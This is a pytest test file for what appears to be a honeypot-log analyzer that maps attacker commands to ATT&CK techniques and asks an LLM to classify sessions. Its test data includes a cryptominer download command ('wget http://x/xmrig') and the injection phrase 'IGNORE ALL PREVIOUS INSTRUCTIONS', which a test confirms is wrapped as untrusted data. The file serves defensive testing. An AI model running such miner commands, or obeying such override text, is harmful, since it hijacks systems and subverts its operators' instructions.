from pathlib import Path

import pytest

from panal.analyst import (
    SAMPLES,
    analyze_session,
    build_prompt,
    pending_sessions,
    render_report,
    session_facts,
    validate,
)
from panal.attack import evidence_for
from panal.ingest import load


@pytest.fixture
def con(tmp_path: Path):
    raw = tmp_path / "raw"
    raw.mkdir()
    (raw / "cowrie.json").write_text(SAMPLES.read_text())
    return load(raw, tmp_path / "db.duckdb", ignore_ips=[])


def test_rules_map_miner_commands() -> None:
    ids = [e.technique for e in evidence_for(0, 1, ["wget http://x/xmrig", "chmod +x xmrig"])]
    assert ids == ["T1078", "T1059.004", "T1105", "T1496", "T1222.002"]


def test_scanner_gets_active_scanning() -> None:
    assert [e.technique for e in evidence_for(0, 0, [])] == ["T1595"]


def test_validate_drops_unknown_techniques_and_values() -> None:
    clean, hallucinated = validate(
        {
            "category": "alien",
            "severity": "apocalyptic",
            "techniques": ["T1496", "T9999", "t1105"],
            "summary": " ok ",
            "recommendations": ["a"],
        },
        evidence_ids=["T1059.004"],
    )
    assert hallucinated == ["T9999"]
    assert clean["techniques"] == ["T1059.004", "T1496", "T1105"]
    assert (clean["category"], clean["severity"], clean["summary"]) == ("other", "medium", "ok")


def test_prompt_wraps_attacker_text_as_data(con) -> None:
    prompt = build_prompt(session_facts(con, "demo-inject"))
    body = prompt.split("<untrusted_session_data>", 1)[1].rsplit("</untrusted_session_data>", 1)[0]
    assert "IGNORE ALL PREVIOUS INSTRUCTIONS" in body
    assert "<" not in body  # attacker cannot close the delimiter


def test_scan_and_brute_force_skip_the_model(con) -> None:
    def boom(*_):
        raise AssertionError("model should not be called")

    assert analyze_session(con, "demo-scan", boom, "m")["category"] == "scan"
    assert analyze_session(con, "demo-brute", boom, "m")["category"] == "brute_force"


def test_full_analysis_and_report(con) -> None:
    def fake_llm(system, user, schema):
        assert "untrusted_session_data" in system and "xmrig" in user
        return {
            "category": "cryptominer",
            "severity": "high",
            "techniques": ["T1496", "T1234"],
            "summary": "Miner installed.",
            "recommendations": ["Block pool"],
        }

    a = analyze_session(con, "demo-miner", fake_llm, "fake")
    report = render_report(a)

    assert a["hallucinated"] == ["T1234"]
    assert "T1070.003" in a["techniques"]  # history -c, found by rules
    assert "| T1496 | Resource Hijacking | Impact |" in report
    assert "SHA-256: `" + "a" * 64 + "`" in report
    assert "demo-miner" not in pending_sessions(con, 50)


def test_report_escapes_pipes_in_table(con) -> None:
    def fake_llm(system, user, schema):
        return {
            "category": "persistence",
            "severity": "high",
            "techniques": [],
            "summary": "x",
            "recommendations": ["y"],
        }

    report = render_report(analyze_session(con, "demo-persist", fake_llm, "fake"))
    cron_row = next(line for line in report.splitlines() if line.startswith("| T1053.003"))
    assert cron_row.count(" | ") == 3  # pipes inside the evidence are escaped
